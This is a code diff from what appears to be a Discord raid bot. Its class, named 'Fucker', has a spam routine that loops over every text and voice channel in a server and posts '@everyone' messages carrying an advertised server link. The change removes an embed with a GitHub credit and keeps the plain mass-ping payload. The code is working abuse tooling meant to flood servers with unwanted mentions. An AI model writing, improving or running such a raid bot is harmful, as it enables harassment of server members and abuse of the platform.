@@ -5,7 +5,7 @@ from aiohttp import ClientSession
 
 import random
 
-from core.config.config import (CHNAME,  LINKSERV, TEXT, headers, NAME)
+from core.config.config import (CHNAME,  LINKSERV, headers, NAME)
 from core.tasks import create_tasks, request
 
 
@@ -17,11 +17,7 @@ class Fucker:
     async def spam(self, ctx):
         spam_amount = 10
         urls = []
-        embed = {
-            "title": "voby7 | github.com/Ramimnur20",
-            "description": f"```{TEXT}```\n\n> {LINKSERV}",
-        }
-        json = {"content": f"@everyone {LINKSERV}", "embed": embed}
+        json = {"content": f"@everyone {LINKSERV}"}
 
         channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
         for channel in channels:
